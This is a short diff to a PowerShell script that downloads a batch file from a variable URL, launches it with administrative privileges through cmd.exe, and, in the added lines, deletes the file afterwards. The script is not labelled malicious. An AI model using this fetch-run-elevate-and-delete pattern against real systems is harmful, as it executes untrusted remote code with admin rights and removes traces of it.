@@ -13,7 +13,7 @@ try {
     Write-Host "Successfully downloaded the script from $RandomURL1"
 }
 catch {
-    Write-Host "Failed to download the script from $RandomURL1: $_"
+    Write-Host "Failed to download the script from $RandomURL1: $_.Exception.Message"
     exit 1
 }
 
@@ -39,3 +39,9 @@ Write-Host "Saved the script to: $FilePath"
 $Command = "/k start cmd.exe /c $FilePath $ScriptArgs"
 Start-Process -FilePath "cmd.exe" -ArgumentList $Command -Verb RunAs -Wait
 Write-Host "Launched the batch file with administrative privileges in a new Command Prompt window"
+
+# Clean up the file
+Remove-Item -Path $FilePath -Force
+Write-Host "Cleaned up the batch file: $FilePath"
+
+Write-Host "Script execution completed."
